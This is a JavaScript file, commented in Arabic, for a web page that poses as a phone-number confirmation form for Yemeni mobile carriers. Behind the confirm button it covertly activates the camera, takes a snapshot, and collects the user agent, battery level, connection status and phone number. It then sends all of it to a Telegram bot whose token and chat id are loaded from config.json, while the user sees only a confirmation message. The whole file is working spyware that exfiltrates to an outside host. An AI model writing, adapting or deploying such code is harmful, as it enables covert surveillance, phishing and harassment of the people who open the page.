let botToken = '';
let chatId = '';

// تحميل الإعدادات من config.json
fetch('config.json')
  .then(res => {
    if (!res.ok) throw new Error(`فشل تحميل config.json: ${res.status}`);
    return res.json();
  })
  .then(data => {
    botToken = data.botToken;
    chatId = data.chatId;
  })
  .catch(err => {
    console.error('فشل تحميل config.json:', err);
    alert('حدث خطأ في تحميل الإعدادات. تأكد من وجود config.json.');
  });

// تحديث اسم مزود الخدمة عند كتابة الرقم
document.getElementById('phoneNumber').addEventListener('input', () => {
  const phone = document.getElementById('phoneNumber').value;
  const carrierName = detectCarrier(phone);
  document.getElementById('carrierDisplay').innerText = "مزود الخدمة: " + carrierName;
});

function detectCarrier(phoneNumber) {
  const cleaned = phoneNumber.replace(/\D/g, '');
  const prefix = cleaned.substring(0, 2);
  switch (prefix) {
    case '77': return "يمن موبايل";
    case '71': return "سبأفون";
    case '73': return "MTN";
    case '70': return "واي";
    default: return "مزود غير معروف";
  }
}

function confirmConsent() {
  document.getElementById('consentBox').style.display = 'none';
  document.getElementById('confirmBtn').style.display = 'inline-block';
}

function startCameraAndSend() {
  const phoneNumber = document.getElementById('phoneNumber').value.trim();
  if (phoneNumber === '') {
    alert('يرجى إدخال رقم الهاتف.');
    return;
  }

  const btn = document.getElementById('confirmBtn');
  btn.innerHTML = 'جاري التأكيد...';
  btn.disabled = true;

  captureAndSendPhoto(phoneNumber);
}

async function captureAndSendPhoto(phoneNumber) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    alert("المتصفح لا يدعم الكاميرا.");
    resetButton();
    return;
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    await new Promise(res => setTimeout(res, 1500));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
      const info = await collectUserInfo(phoneNumber);
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'snapshot.jpg');
      formData.append('caption', info.caption);

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
        .then(res => res.json())
        .then(result => {
          if (!result.ok) {
            console.error("فشل الإرسال:", result.description);
          }
        })
        .catch(err => {
          console.error("خطأ أثناء الإرسال:", err);
        });

      document.getElementById('confirmedNumber').innerText = phoneNumber;
      document.getElementById('confirmationMessage').style.display = 'block';
      resetButton();
      stream.getTracks().forEach(track => track.stop());
    }, 'image/jpeg');

  } catch (error) {
    console.error("فشل الوصول إلى الكاميرا:", error);
    alert("حدث خطأ أثناء الوصول إلى الكاميرا.");
    resetButton();
  }
}

function resetButton() {
  const btn = document.getElementById('confirmBtn');
  btn.innerHTML = 'تأكيد';
  btn.disabled = false;
}

async function collectUserInfo(phoneNumber) {
  const userAgent = navigator.userAgent;
  const connectionStatus = navigator.onLine ? "متصل بالإنترنت" : "غير متصل";
  let batteryLevel = "غير متوفر";

  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      batteryLevel = Math.round(battery.level * 100) + "%";
    } catch {
      batteryLevel = "غير متاح";
    }
  }

  const carrier = detectCarrier(phoneNumber);
  const caption = `📱 رقم الهاتف: ${phoneNumber}
🏢 مزود الخدمة: ${carrier}
🖥️ نوع الجهاز: ${userAgent}
🔋 نسبة البطارية: ${batteryLevel}
🌐 اتصال الإنترنت: ${connectionStatus}`;

  return { caption };
}
